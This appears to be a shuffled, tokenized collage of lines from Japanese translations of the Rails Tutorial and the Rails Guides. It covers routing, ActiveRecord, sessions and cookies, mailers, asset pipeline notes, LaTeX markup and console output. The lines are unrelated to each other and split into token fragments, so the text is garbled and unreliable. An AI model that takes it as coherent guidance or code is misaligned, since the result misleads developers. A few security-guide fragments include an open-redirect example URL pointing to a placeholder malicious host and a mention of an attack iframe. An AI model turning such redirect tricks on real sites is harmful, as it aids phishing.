▁ ╼ # ╼ # ▁If ▁you ▁find ▁yourself ▁ignoring ▁temporary ▁files ▁generated ▁by ▁your ▁text ▁editor ╼ # ▁or ▁operat ing ▁system , ▁you ▁ probably ▁want ▁to ▁add ▁a ▁ global ▁ignore ▁instead : ╼ # ▁git ▁config ▁-- global ▁ core ▖ exclude s file ▁' ~ / ▖ gitignore _ global ' ╼╼ # ▁I gnore ▁ bundler ▁config ▖
▁CSRF 保 護 を トリガ ー するようになります 。
▁リスト \ ref { code : friendly _ forwarding _ code } の \ k ode { store \_ location } メソッドでは 、 ▁ リクエストが 送 られた URL を \ k ode { session } 変数 の \ k ode { : forwarding \_ url } キー に 格 納 しています ▟ ただし 、\ k ode { GET } リクエストが 送 られた とき だけ 格 納 する ように しておきます 。
▁ 正しく は 、\ k ode { sudo } は \ k ode { s u } コマンド と 英語 の ▁“ do ” ▁ を つ な げ た ものです ▟ そして \ k ode { s u } コマンドは ▁“ s ub st it ute ▁user ” ▁( ユーザーの 切 替 ) ▁ の 略 なのです ▟ ターミナル で \ k ode { man ▁ s u } と 入力 すれば この ことを確認 できます 。
▁ 返 された 項目 のうち 、 最後の 項目 だけ が使用されます 。
▁create ▁app / assets / javascripts / blorgh / articles ▖ js
▁ 正しい パスワード
▁ 本書 では 、 以後 サンプルアプリケーション を 肉 付け すること に 専 念 します ▟ 最初に 、 ユーザー登録 、 サインイン 、 サインアウト できる ユーザー を追加します ▟ 次に 、 マイクロポスト を追加します ▟ 最後に 、 他のユーザーをフォロー できるようにします 。
▁* ▁` development ` 環境 は 、 ローカル の開発 環境で アプリケーション と 手動で やりとり を行う ために 使用されます 。
▁helper ▁module _ path
▁X - Cache - H it s :
▁ Category ▖ joins ( articles : ▁[ { ▁comments : ▁: guest ▁ }, ▁: tags ])
▁ SELECT ▁* ▁FROM ▁articles ▁WHERE ▁id ▁> ▁10 ▁LIMIT ▁20
▁Micropost モデル のバリデーション
▁resources ▁: photos
▁if ▁email ▖ has _ attachments ?
▁ これを行うには 、\ k ode { rails ▁generate ▁ rspec : install } を実行します 。
▁ まず 、 上の 3 つの 例 は いずれも ルート へのアクセス を 含 んで い ること に 気 付き ます 。
▁上のように 20 年 で 期限切れ になる cookies 設定 は よく 使われ る ようになり 、 今 では Rails にも 特殊な \ k ode { permanent } という 専 用の メソッド が追加された ほど です ▟ この メソッドを使用すると 、 コードは 以下のように シ ン プ ル になります 。
▁JavaScript 組み込み Ruby を使用して フォロー の リレーションシップ を作成する 。
▁Ruby では 、「 変数 の 値が \ text tt { nil } なら 変数 に 代入 する が 、 nil で なければ 代入 しない ▁( 変数 の 値を 変 え ない )」 という 操作 が 非常に よく使われます 。
▁| ▁| ▁4 14 ▁| ▁: request _ ur i _ to o _ long ▁|
▁[] ▖ sum (1) ▁# ▁=> ▁1
▁* ▁`: address ` ▁- ▁ リモート の メール サーバー を指定します 。
▁self を省略した 結果を リスト \ ref { code : downcase _ bang } に示します 。
▁| ▁------- --------------- ▁| ▁ --- ---------------- ---------------- ▁|
▁Active ▁Record は 、 ORM ▁( オブジェクト リ レ ー シ ョ ナ ル マッピング ) ▁ システム に記述 されている 「 Active ▁Record パターン 」 を実装 した もの であり 、 同じ 名前 が 付け ら れ ています 。
▁create ▁app / views / users / new ▖ html ▖ erb
▁ エンジンの ルート ディレクトリ で ` rake ▁db : migrate ` を実行すると 、 scaffold ジェネレータ によって 生成された マイグレーション が 実行されます ▟ 続いて ` test / dummy ` ディレクトリ で ` rails ▁server ` を実行し てみましょう 。
▁<%= ▁link _ to ▁' New ▁article ', ▁new _ article _ path ▁%>
▁== ▁Create Microposts : ▁migrat ing ▁============= ================
▁{0} 図 11 ▖ 8 {/0} ▁{1} 別 ユーザーの プロフィール と マイクロポスト ▁(\ href { http :// localhost :3000/ users /5}{/ users /5}) {/1}
▁ 組み込み クラス の変更は きわめて 強力な テクニック ですが 、 大 い なる 力 には 大 い なる 責 任 が 伴 います ▁( 訳 注 : ▁ 「 ス パ イ ダ ー マ ン 」 の 名 台 詞 )▟ 従って 、\ emph { 真 に } 正 当 な 理由 が ない限り 、 組み込み クラス に メソッド を追加する ことは 無 作 法 である と 考 えられ ています 。
▁#### ▁ パーシャル レイアウト
▁articles ▁GET ▁ / articles (▖ : format ) ▁articles # index
▁mail ( subject : ▁" New ▁User ▁Signup : ▁# {@ user ▖ email } ")
▁デフォルトは true です 。
▁=> ▁ { : success =>" It ▁work ed !" , ▁: error =>" It ▁failed ▖ "}
▁Ruby ▁console ▁for ▁your app ▖ heroku app ▖ com
▁ 実は ` Rails :: Application ` は ` Rails :: Railtie ` を 間 接 的に 継 承 しています ▟ その おかげで 、` config / application ▖ rb ` で ` initializer ` メソッドを使用して アプリケーション 用の イニシャライザ を 定義 できる のです 。
▁stylesheet _ path ▁" application " ▁# ▁=> ▁ / assets / application ▖ css
▁ 本チュートリアル を 読み 終 え る 頃 には 、 取り 組み 前の 知識 量 の 多少 にかかわらず 、 より 高度な Rails の 情報 源 を 理解 できるように な っている はずです 。
▁今度は この 機能を アプリケーション の中で 使用 してみましょう 。
▁# ▁def ▁self ▖ find _ by _ login _ and _ activated (* args )
▁(\ ref { sec : development _ environment } で 推 奨 されている クラウド IDE を ご 利用 の場合は 、 この 2 つ目の アプリ は 1 つ目の アプリ と同じ ワークスペース に 作成される という 点に注意 する必要があります 。
▁ レコード を検索し 、 レコードが なければ 作成する 、 という のは よく ある 一連の 流れ です 。
▁ 有効な 名前 が 既に あれば 警 告 が表示されます 。
▁ 同様に 以下のコード は 、
▁\ emph { Rails チュートリアル } では Ruby 共通の 慣習 に従って 、 短い 1 行 の ブロック には 波 かっこ を使用し 、 長い 1 行 や 複 数 行 の ブロック には \ k ode { do ▖ ▖ end } 記 法 を使用しています 。
▁ Cl ic k ▁on ▁the ▁link ▁below ▁to ▁activate ▁your ▁account : ╼ </ p >╼╼< a ▁ href =" http :// rails - tutorial - c 9 - mhartl ▖ c 9 ▖ io / account _ activations / ╼ f F b _ F 9 4 m g Q t m l S v R F G s IT w / edit ?
▁ RVM をインストール 後 、 以下を実行して Ruby インストール のための 要 件 を調べ ます 。
▁Heroku は 、 開発環境 と 本番環境 と で 同じ データベース を使う ことを 推 奨 しています が 、 今回 開発 する サンプルアプリケーション では 、 データベース が 異 な って いて も 特に 問題 はありません ▟ また 、 SQLite は PostgreSQL に 比 べ て \ emph { 極めて 簡単に } ▁ セットアップ できます 。
▁WARNING : ▁ doc rails には 次の 厳 格 な ポ リ シ ー が 制 定 されている ことを 理解 しておく必要があります : ▁ 「 doc rails のコードは 1 文字 たり とも 絶対に 変更 し ないこと 」
▁ ユーザーを 記 憶 する
▁NOTE : ▁production モード で 見つからない プリコンパイル 済み ファイル があると 、 見つからない ファイル名 を エラーメッセージ に 含 んだ ` Sprockets :: Helpers :: Rails Helper :: Asset P a th s :: Asset Not P re compiled Error ` が発生し ます 。
▁< head >
▁\ k ode { coffee - rails } ▁( これも Asset ▁Pipeline で使用する gem です ) ▁ のバージョン が \ k ode { 4▖0▖0 } より 大きく 、\ k ode { 4 ▖ 1 } より 小さい 場合に インストール するようになります 。
▁#### # ▁Web ページの 汚 損
▁\ k ode { session } メソッド で作成した 一時 cookies は自動的に 暗号化 され 、 リスト \ ref { code : log _ in _ function } のコードは 保 護 されます ▟ そして ここ が 重要な のですが 、 攻撃者が たとえ この 情報を cookies から 盗 み 出 す ことができ た としても 、 それ を使って 本 物 のユーザー として ログイン することは できない のです 。
▁#### ▁ 追加 された new アクション への ルーティング を追加する
▁以上で 終わり です 。
▁=> ▁"2013-03-11 ▁01 : 37 : 32 "
▁use ▁Rack :: ETag
▁これは 最も 頻繁に 使用される オプション です 。
▁# ▁or ▁operat ing ▁system , ▁you ▁ probably ▁want ▁to ▁add ▁a ▁ global ▁ignore ▁instead :
▁( Spring に 関連 した エラーが発生し たら 、 同じ コマンドを もう一度 実行 してみてください ) 。
▁Micropost モデル を作成 したときに 、 マイクロポスト は 投 稿 した ユーザーの id ▁( user _ id ) ▁ を 持 た せる ように しました 。
▁* ▁` save !
▁この ブロック は 、 他の イニシャライザ によって 設定 される 値を 設定 するのに 便利です 。
▁つまり 、 WEBrick は \ href { https :// dev center ▖ heroku ▖ com / articles / ruby - default - web - server } { 本番環境 として 適切な Web サーバ ではありません } ▟ よ って 、 今回は \ href { https :// dev center ▖ heroku ▖ com / articles / deploying - rails - application s - with - the - puma - web - server } { WEBrick を Puma という Web サーバ に置き換え て みます } ▟ Puma は 多数の リクエストを 捌 く ことに 適 した Web サーバ です 。
▁### ▁ マニフェストファイル と ディレクティブ
▁* ▁ 例外 を ログ に 残 し 、 ローカル からの リクエスト の場合は 、 デバッグ 用の ページ を表示します 。
▁ユーザーの 削除 は どの ユーザーに も 許可 できる もの では ないので 、 管理ユーザー ▁( admin ) ▁ の 特 権 クラス を作成し 、 この ユーザーに のみ 削除 を 許可 する ようにします 。
▁( ちなみに \ href { http :// www ▖ example ▖ com /}{ example ▖ com } という ドメイン 名 は 、 例として 使用 するために 特 別 に 予 約 された ドメイン と なっています )
▁" hello "▖ to ( - 2 ) ▁# ▁=> ▁" hell "
▁### ▁ 関連付けの コールバック
▁たとえば 、` global ▖ css ` という CSS ファイル名 は以下のようになります 。
▁Rails は 、 マイグレーション 時に 作成 日 と 更新 日 を 追 跡 するための タイムスタンプ フィールド を 2 つ 作成します ▟ これは 指定 が なくても 自動的に 行われます 。
▁Active ▁Record では 、 モデル名 に対応する デフォルトの テーブル名 を 求 め る ときに このメソッド を使用しています 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / file / atomic ▖ rb ` です 。
▁sample ▁application ▖
▁self ▖ table _ name _ prefix ▁= ▁" "
▁Sprockets は すべての JavaScript ファイルを 1 つの マ ス ター ` ▖ js ` ファイルに 連結 し 、 すべての CSS ファイルを 1 つの マ ス ター ` ▖ css ` ファイルに 連結 します 。
▁この 新 機能 では 、 ユーザー 作成 時に 「 仮 のユーザー アカウント 」 を作成し 、 ア ク テ ィ ベ ー ション 用の URL を メール で 送信 し 、 URL に ユーザーが アクセス したら ユーザー アカウント を有効に する という 手順 が必要です 。
▁WARNING : ▁` find ` メソッドで 与えられた 主キー の中に 、 どの レコード にも マッチ しない 主キー が ** 1 つ でも ** ある と 、` ActiveRecord :: RecordNotFound ` 例外が発生します 。
▁<%= ▁link _ to ▁' Destroy ▁ Comment ', ▁[ comment ▖ article , ▁comment ] ,
▁ ユーザー編集ページ のテスト 。
▁以下の SQL 文 で ` products ` テーブル を 作成した とします 。
▁ 各 ユーザーは 、 User モデル 上に 名前を持つ ことを 強 制 される ようになりました ▟ しかし 、 これ だけで は 十分 ではありません ▟ ユーザーの 名前 は サンプル Web サイト に表示される もの なので 、 名前 の長さ にも 制限 を与える 必要があります 。
▁ http :// www ▖ your application ▖ com / controller / action ? referer = http :// www ▖ malicious ▖ t ld
▁このヘルパーは 、 与えられた 集合 に 属性の値 が含まれている かどうか を検証します 。
▁╼╼\ section { Account Activations リソース } ▁% ▁( fold )╼\ label { sec : account _ activations _ resource }╼╼
▁def ▁ visible _ articles
▁render ▁layout : ▁" special _ layout "
▁ 同様に 、 よく 使われ る 操作を ヘルパーメソッド として 定義 することもできます 。
▁Sessions コントローラ がある ことで 、 Users コントローラで \ k ode { log \_ in } メソッド を使用 できるようになります ▟ そのために 必要な モジュール は リスト \ ref { code : sessions _ helper _ include } で インクルード されています 。
▁Guard 、 Spork 、 テスト 通知 機能 ▁( オプション ) ▁ を使用して 便利な テスト 環境 を 構 築 することで 、 テスト駆動開発 が や み つ き になる ことでしょう 。
▁ CarrierWave で アップロード された 画像 は 、 Active ▁Record モデルの 属性 と 関連付け されている べ き です ▟ 関連付け される 属性 には 画像 の ファイル名 が 格 納 される ため 、 String 型 に しておきます 。
▁ 属性 を更新する もうひとつ の 方法は 、\ k ode { update _ attributes } を使う ものです 。
▁ 悪意のある ユーザーが このとき 最初に 行なう のは 、 以下のような 操作 です 。
▁この クラスは 、 アプリケーションで 以下のコマンドを実行し て 生成 できます 。
▁ 新しく 動作する Rails アプリ が 完成 した ところで 、 さ っ そ く アプリケーションの ソースコード を \ emph { バージョン管理 } 下 に置き ましょう ▟ これ を行わ ない と アプリケーションが 動かない ということ ではありません が 、 ほとんどの Rails 開発者 は バージョン管理 は 開発 現 場 において 必要 不可 欠 である と 考え ています 。
▁* ▁Action ▁View の概要 と Rails での 利用 法
▁ 定義 済み のバリデーション 関数 はありません 。
▁ リソース フル でない ルーティング
▁TIP : ▁ データベースの 接続 設定 を 手動で 更新 する必要はありません 。
▁ コードを 書いた り ドキュメント を作成 したり する まで には 至 ら なくても 、 issue の レポート や パッチ のテスト など 、 さまざまな 方法で 貢献 することができます ▁( 訳 注 : ▁** サンプル の 文 章 も 日本語 に 翻 訳 されています が 、 実際には 必ず 英語 を使う ようにしてください ** ▁ ) 。
▁ ありがたい ことに 、 文字列 キー なら \ k ode { cookies } で \ emph { 使用できる } ので 、
▁ n >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁access _ control ▁( end )╼╼ ▁\ subsection { マイクロポスト を作成する } ▁% ▁( fold )╼ ▁\ label { sec : creating _ microposts }╼╼
▁` ActiveSupport :: File Update C h ec k er ` ▁API に従う 必要があります 。
▁最初に 失敗する テストを 書き 、 次に その テストにパス する ように 実装 することで 、 正常に 動作する About ページ を作成 できた という 実 感 を得る ことができます 。
▁< p > Hello , ▁Rails !
▁上の iframe は 、[ M p ac k 攻 撃 フレームワーク ]( http :// is c ▖ s an s ▖ org / d i ary ▖ html ? s to ry id = 30 15 ) を使用して イ タ リ ア にある Web サイト への 攻 撃 で 実際に 用 い られた ものです 。
▁< p > Here ▁are ▁a ▁few ▁of ▁our ▁fine ▁ products : </ p >
▁Rails アプリケーションは 以下の 値を 空白 ( blank ) と み な します 。
▁resources ▁: comments ▁do
▁[ { a : ▁1, ▁b : ▁2 }, ▁ { c : ▁3 } ] ▖ to _ xml
▁option _ groups _ from _ collection _ for _ select (@ con t in ent s , ▁: count r ies , ▁: name , ▁: id , ▁: name , ▁3 )
▁最初の ユーザー登録ページ ▁( ス タブ )
▁gem ▁' blorgh ', ▁path : ▁"/ path / to / blorgh "
▁ 余 計 な もの を 削 ぎ 落 した結果 、 シンボル 同士 の 比 較 を 容易に 行えます ▟ 文字列 は 1 文字 ずつ 比 較 する必要があります が 、 シンボル は 一度 に 全体 を 比 較 できます 。
▁上の 呼び出し により 、` _ menu ▖ html ▖ erb ` という名前の ファイル の内容 が 、 render メソッドを 書いた その 場所 で レンダリング されます 。
▁ 先ほど 、 コンソール の 出力結果 から ユーザーの ID が ▁\ k ode {1} ▁ である ことを確認 しました ▟ 次の 目標は 、 このような ユーザー情報 を Web アプリケーション 上に 表示 することです 。
▁P end ing :
▁ Q u al if i ed C on st Util s ▖ raise _ if _ absolute ( path )
▁しかし 、 ヘルパー モジュール が 存在しない ために 別の ライブラリ が必要 になり 、 それが さらに 見つからない という 場合 が考えられます 。
▁" Invoice L in e "▖ foreign _ key ▁# ▁=> ▁" invoice _ line _ id "
▁\ k ode { create } アクション で S trong ▁Parameters を使用する
▁以下の 場合は 等 幅 フォント を使用すること 。
▁ 人 々 が ソフトウェア に 恐怖 心 を 抱 く のは 、 結 局 これが 原 因 な の だ 。
▁ 必要となる \ k ode { picture } 属性を Micropost モデル に追加する ために 、 マイグレーション ファイル を生成し 、 開発環境 の データベースに 適用 します 。
▁しかし 上のような 処理 は 、 テーブルの サイズ が 大きく なる に つ れ て 非 現 実 的 になります ▟ ` User ▖ all ▖ each ` は 、 Active ▁Record に対して ▁ _ テーブル 全体 _ ▁ を 一度 に 取り出し 、 しかも 1 行 ごとに オブジェクト を生成し 、 その 巨 大 な モデルオブジェクト の配列 を メモリ に 配置 する からです 。
▁use ▁Rack :: Sendfile
▁date ▖ years _ since (10) ▁# ▁=> ▁Sun , ▁ 07 ▁Jun ▁20 20
▁ユーザー登録 ページのモックアップ
▁上 では \ k ode { rake ▁test : models } という コマンドを実行 しています が 、 これは モデル に関する テスト だけ を 走 ら せる コマンド です ▁(\ ref { sec : layout _ link _ tests } で 使 った \ k ode { rake ▁test : integration } と 似 ていることに注目してください ) 。
▁* ▁ 冒 頭 に アンダースコア がある場合 は 削除します 。
▁ サインイン / サインアウト が動作する ようになり 、 実 用 的な アプリケーション ら しく な って きました ▟ 今度は 、 サインイン の状態 に合わせて レイアウト 上の リンク が 変わる ようにしましょう 。
▁上のコード を \ k ode { edit } アクション ▁( リスト \ ref { code : account _ activation _ edit _ action }) ▁ で 使用します 。
▁### ▁G mail 用の Action ▁Mailer 設定
▁ 同様に 、 以下のような コードを 何 度 も 書く のは 多くの 人 にとって 苦 痛 だ と思います 。
▁NOTE : ▁Ruby ▁on ▁Rails の 最新 リリース で 見つけ た バグ は 最も 注 目 を 集 め る可能性があります 。
▁上のルーティングは GET リクエスト と それ に 伴 う ` / photos /1/ preview ` を 認 識 し 、 リクエストを ` Photos ` コントローラの ` preview ` アクションに ルーティング し 、 リソース id 値を ` params [: id ]` に 渡します 。
▁ ステータスフィード の パーシャル
▁parts _ order : ▁[" text / plain ", ▁" text / en ri ch ed ", ▁" text / html "]
▁なお 、 本書 を進める 間 、 アプリケーションを 定 期 的に GitHub に プッシュ したり 、 Heroku にデプロイする ことをお勧めします 。
▁render ▁file : ▁filename , ▁content _ type : ▁" application / rs s "
▁\ k ode { class ▁ UsersController ▁< ▁Application Controller } という 記 法 は 、 Ruby の \ emph { クラス } での \ emph { 継 承 } の使用 例 となっている ことにも注目してください
▁{0} 図 5 ▖ 8 {/0} ▁{1} \ href { http :// localhost :3000/ about }{/ about } で表示される About ページ {/1}
▁Git で バージョン管理 を 行 な っている のであれば 、 この タイミング で ユーザーを モデリング するための トピックブランチを作成 しておいてください 。
▁ 索 引 の ない 本 では 、 与えられた 言葉 ▁( 例えば 、 “ foobar ” ) ▁ が 出 て く る 箇所 をすべて 見つけ るために は 、 ページを 端 から 順に め く って 最 後 まで 探 す 必要があります ▁( 紙 バージョンの 全 表 ス キャン ) 。
▁もちろん 、 シ ン プ ル になった ということは 完成 度 が \ emph { さらに } 高 ま った ということ の 証 し であり 、 退 化 した わけではありません ▟ {1} {2} 第 2 章 {/2}{/1} で scaffold に 頼 り き り だった 頃 から ここに 至 る まで は 長い 道 の り でした が 、 今 では scaffold が 生成する ような 複雑な コード はほとんど 不要 になりました 。
▁この 実装 を書く には 、 正しい 動作を より 深 く 理解 する必要があります ▟ フォロー すること と フォロー解除 することは 、 それぞれ リレーションシップ を \ emph { 作成 } すること と \ emph { 削除 } することです ▟ これは つまり 、 Relationship s コントローラで \ k ode { create } アクションと \ k ode { destroy } を定義する ということ であり 、 この コントローラ を作成する必要があります 。
▁\ emph { s p or k } は s po on - for k を 組み合わせ た 造 語 です 。
▁これは 正常に動作し ます ▟ しかし 少し 残 念 な のは 、\ k ode { current \_ user } が ページ 内で 複 数 使用されている と 、 同じ 回 数 だけ データベース も 呼び出され てしまう ことです 。
▁Rails は 、 このような メッセージ を User モデルの 検証 時に 自動的に 生成 してくれます 。
▁\ href { http ://0▖0▖0▖0:3000/ microposts / new }{/ microposts / new } ページ をブラウザで開き 、 新しいマイクロポスト の 情報を 入力 して マイクロポスト をいくつか 作成 してみましょう ▁({1}{2} 図 2▖1 2 {/2}{/1} ) 。
▁Rails の各 バージョンの 変更 点を ここに 記 録 します 。
▁The ▁inheritance ▁hierarchy ▁for ▁the ▁( n on - built - in ) ▁\ k ode { Word } ▁class ▁from ▁Listing ▁\ ref { code : word _ class } ▖
▁ それ以外の 場合は 、` F lo at ` で 値を 数値 に変換 してから バリデーション を 行 お う とします 。
▁* ▁` collection ▖ exists ? (▖▖▖)
▁ ルーティングヘルパー を使用する 方法 の他に 、 パラメータ の配列 から パス や URL を作成する こともできます 。
▁ ╼\ end { code }╼╼ ▁\ subsection { ユーザーが セキュア な パスワード を持っている } ▁% ▁( fold )╼ ▁\ label { sec : has _ secure _ password }╼╼
▁\ ref { sec : signup _ failure } では 、 ユーザーが 制 約 に 違 反 したときに 、 検証 機能 によって自動的に 表示される 有 用 な エラーメッセージ をお見せします 。
▁次に 、 ログイン に成功した場合 ▁(\ ref { sec : login _ success }) ▁ に使用する 土台 部分 を作成します ▟ ここでは 、 ログイン が 送信される たびに 、 パスワード と メールアドレス の 組み合わせ が 有効 かどうかを 判 定 します 。
▁ 動的 フ ァ イン ダ
▁╼╼ ▁% ▁subsection ▁subsection _ name ▁( end )╼╼ ▁\ subsection { 文字列 } ▁% ▁( fold )╼ ▁\ label { sec : string s }╼╼
▁options _ from _ collection _ for _ select ( collection , ▁value _ method , ▁text _ method , ▁select ed ▁= ▁nil )
▁この 違い は 、 記憶トークン や ダイジェスト は既に データベースに い る ユーザーの ために 作成される ▁( その 分 や り やすい ) ▁ の に対し 、\ k ode { before _ create } コールバック の 方は ユーザーが 作成される \ emph { 前 } に 呼び出される ▁( その 分 面倒 ) ▁ こと が原因で す 。
▁ このため 、 以下のような 旧 式 の ハッシュ ロ ケ ッ ト 記 法 を使用する しか ないので す 。
▁flash [" string "] ▁= ▁" a ▁string "
▁C on fi rm ▁D ia log ]( images / getting _ started / con fi rm _ d ia log ▖ png )
▁# ▁name ▁: string ( 2 55 )
▁なお 、 ローカル システム 上で 開発 する 場合は 普通 の ターミナル を使用します ▟ クラウド IDE を使用している場合 は 、 図 \ ref { fig : ide _ an atom y } の コマンドライン エリア に 入力 します 。
▁ コンソール で \ k ode { Word } クラス を定義する 。
▁ 以前 と同様 、 Factory ▁Girl を使用して ユーザーを シ ミ ュ レ ート する ことにします が 、 ここで 早く も 問題が生じ ます ▟ ユーザーの メールアドレス は 一意 でない と い け ません が 、 この まま だと 手 作業 で 30 人 もの メールアドレス を作成し なければなりません 。
▁\ k ode { name } 属性 と \ k ode { email } 属性 の 存在性 を検証する 。
▁### ▁JSON ▁support
▁ これはリスト \ ref { code : demo _ microposts _ controller } で使用されていました 。
▁ _ first _ feed _ implementation ▁( end )╼╼ ▁\ subsection { サブ セレクト } ▁% ▁( fold )╼ ▁\ label { sec : scope s _ subselect s _ and _ a _ lambda }╼╼
▁上のコードでは 、` app / views / shared / _ menu ▖ html ▖ erb ` パーシャル を 読み 込 んで 使用します 。
▁ このため 、 マイクロポスト が Home ページ から 削除され た場合 でも Pro file ページ から 削除され た場合 でも 、\ k ode { request ▖ ref er r er } を使う ことで DELETE リクエストが 発 行 された ページに 戻 す ことができる ので 、 非常に 便利です 。
▁ 逆に 大きな 章で 構成 されている ドキュメント であれば 、 " Example s " セクション を 設 け ても よい 。
▁" It ▁work ed !"
▁ コメント する あなた が 十分 時間 を かけて プルリクエスト を 読 んだ ということ が 皆 に 伝 わ るように 書き ましょう 。
▁この 実装 には 1 つだけ ト リ ッ キー な 部分 があります ▟ それ は Users コントローラに 2 つの 新しい アクション を追加する 必要がある ということです 。
▁ ブロック には 複数の 行 を 記 述 できます ▁( 実際 ほとんどの ブロック は 複 数 行 です ) 。
▁` prev _ year ` は ` last _ year ` の別名 です 。
▁その ブロック 内で は 、 プロキシ に対して 呼び出され た メソッドに オプション を追加した うえで 、 その メソッドを レシーバ に 転 送 します 。
▁従って 、 アプリケーションで 必要な ルーティング を 個 別 に設定する ことになります 。
▁ リソース ベースの ルーティング ▁( 以下 リソース ルーティング ) ▁ を使用することで 、 リソース ベース で 構成 された コントローラ に対応する 共通の ルーティング を 手 軽 に 宣言 できます 。
▁API が 安 定 したら 可視性 を変更 できます が 、 後 方 互換性 を 保 ち ながら パブリックな API を変更する ことは 簡 単 ではありません 。
▁#### # ▁ 実行時に レイアウト を指定する
▁=> ▁" level "
▁ Asset ▁Pipeline では L ess を使う こともできます ▟ 詳 しく は \ href { http :// rubygems ▖ org / gem s / less - rails - bootstrap }{\ text tt { less - rails - bootstrap } ▁gem } を参照してください 。
▁\ ref { sec : hello _ world } では この デフォルト ページ を削除し 、 カスタマイズ した ホームページ に置き換える 予定です 。
▁#### ▁` constantize `
▁ これはリスト \ ref { code : validates _ uniqueness _ of _ email } で使用されていました 。
▁その 直後 、` redirect _ to ` で ブラウザに送信 した HTTP ステータスコード 302 に従って 、 ブラウザから 別の URL への リクエストが サーバー に 送信 され 、 サーバー はその リクエストを 改 めて 処理 します ▟ それ以外の ことは 行 って いません 。
▁( ent er ▁" h " ▁for ▁help ) ▁[ Y na q d h ]
▁Rails には モデル 作成 用の ジェネレータ も あり 、 多くの Rails 開発者 が モデル 作成 の 際に 使用 しています 。
▁\ ref { sec : a _ user _ tour } 以降 で紹介した 各 ページ は 、 Users \ emph { コントローラ } 内の \ emph { アクション } に それぞれ 対応 しています ▟ 1 つの コントローラ には 、 関連する 多数の アクション が まとめ ら れ ています 。
▁ ユーザー表示ページ 用の テスト 。
▁この 重大な バグ を 取り除く には [ 最新の バージョン 4 ]( http :// www ▖ r ed c lo th ▖ org ) を 入 手 してください 。
▁break ;
▁Rails ▖ application ▖ configure ▁do
▁\ k ode { user } に 紐 付 いた マイクロポスト を作成する ▁( 失敗 時に 例外を発生 )
▁ これはリスト \ ref { code : micropost _ access _ control } で使用されていました 。
▁( in ▁ / Users / li fo / Rails / blog )
▁* ▁` bind `
▁{0} 図 1 2▖2 4 : {/0} ▁{1} 本番環境で 動作する ステータスフィード {/1}
▁ モデルのインスタンス が 既に ある 場合は 、 ト ラン ザ ク ション を開始 して その中で ロック を 一度 に 取得 できます 。
▁# ▁=> ▁Thu , ▁01 ▁Apr ▁2010
▁上のコードでは ▁` client ` に対して 明示的に ` readonly ` が指定されてい るため 、 ▁ _ visit s _ ▁ の値 を更新し て ▁` client ▖ save ` を行なう と ` ActiveRecord :: Re ad Only Record ` 例外が発生します 。
▁これにより 、 ひとつ の アプリケーション の中で 複数の 独立した キャッシュ を扱う ことが できるようになります 。
▁これは 、\ k ode { about } ビュー を追加する ことで 解決 します 。
▁\ k ode { log \_ in } のときと同様に 、 リスト \ ref { code : log _ in _ with _ remember } では 実際の Sessions ヘルパー の動作 は 、\ k ode { remember } メソッド 定義 の \ k ode { user ▖ remember } を呼び出す まで 遅 延 され 、 そこで 記憶トークン を生成し て トークン の ダイジェスト を データベースに保存 します 。
▁#### # ▁` months _ ago `、` months _ since `
▁JavaScript では 、 document ▖ cookie プロパティ を使用して ドキュメント の cookie を 読み 書き できます 。
▁| ▁`: words _ connect or ` ▁| ▁` support ▖ array ▖ words _ connect or ` ▁|
▁ 本チュートリアル の アプリケーションの 場合 、 Sessions コントローラの \ k ode { create } アクション では 、\ k ode { user } を ▁( インスタンス変数 ではない ) ▁ 通常の ローカル変数 として 定義 しました が 、 これを インスタンス変数 に 変 え て しま えば 、\ k ode { cookies } に ユーザーの 記憶トークン が正しく 含 まれ ている かどうかを テスト できるようになります 。
▁X - Runtime : ▁0▖0 1 3 48 3
▁ 大文字 小文字 を 区別 しない 、 一意性 のテスト ▁( ▁\ failing ▁ )
▁ どのような 種類の オブジェクト が渡され ても エラーメッセージ パーシャル が 動く ように する必要があります 。
▁\ k ode { has _ secure _ password } で 必要となる \ k ode { password _ digest } 属性 は これで 準備 でき ましたが 、 ハッシュ化 されていない 生の パスワード も 参 照 できる と 便利です 。
▁ attr _ name ▁= ▁@ base ▖ class ▖ human _ attribute _ name ( attribute , ▁default : ▁ attr _ name )
▁このメソッド には ヘッダー の ハッシュ を パラメータ として 渡す ことができます ▟ メソッドを呼び出す と 、 定義 して お いた メール テンプレート に応じて 、 プ レ ー ン テキスト メール または マルチ パ ート メールを送信 します 。
▁ 個 人 的に は \ href { http :// en ▖ w ikipedia ▖ org / wiki / To u ch _ ( Unix )} { Unix の touch コマンド } で ファイル を作成する のが かっこ い い と思います 。
▁ここで いくつか 注意 すべき 点 があります 。
▁Sass を使って スタイルシート を より 簡単に する方法 は 他にも あります が 、 今回は その中で も 最も 重要な 機能 を使って リスト \ ref { code : refactored _ scss } を 書き 直 しました ▟ Sass を使う ことによって 、 素晴らしい ス ター ト を 切 る ことができ ました 。
▁< script ▁src =" http :// html 5 shim ▖ google code ▖ com / svn / t run k / html 5 ▖ js "></ script >
▁ テキストフィールド に 名前とメールアドレス を 入力 して ▁[ Create ▁User ] ▁ ボタン を 押 してください 。
▁ デフォルトの スコープ
▁ 一度 正しい 関連付けを 定義 して しま えば 、\ k ode {@ micropost } 変数 の \ k ode { user \_ id } には 、 関連する ユーザーの id が自動的に 設定 されます 。
▁root ▁to : ▁" articles # index "
▁ 各 行 の 末尾に セ ミ コロン ▁ ; ▁ がある ことに注目してください ▟ ▁これは プログラミング言語 に よく ある 文法 で 、 古 く は 19 50 年 代 中 ご ろ に 開発 された \ href { https :// en ▖ w ikipedia ▖ org / wiki / A L G O L } { A L G O L } まで 遡 ります 。
▁その 場合は 関連付けの メソッド呼び出し で ` true ` を指定する だけで 、 キャッシュ が 破棄され て データ が 再 読み込み されます 。
▁` after _ rollback ` コールバック や ` after _ commit ` コールバック を定義する と 、 この 変更 に とも な う 非推奨 警 告 が表示される ようになりました 。
▁ 特に 、\ emph { Active ▁Record } という Ruby ライブラリ のおかげで 、 {1} {2} リスト 2▖ 6 {/2}{/1} の User モデル は \ k ode { User ▖ all } という リクエスト に対して 、 D B 上の すべての ユーザー を返す ことができます 。
▁\ k ode { do } キーワード は 、 ▁\ k ode { form _ for } が 1 つの 変数 を持つ ブロック を 取ること を表し ます ▟ この 変数 \ k ode { f } は ▁“ form ” ▁ の f です 。
▁# ▁</ contributor >
▁Home ページに フォロー 関連の 統 計 情報 を表示する
▁ パスワード再設定の フォーム
▁Rails ▁ 5▖0 のテスト ケース は 、 デフォルトで ランダム に 実行される ように なる 予定です 。
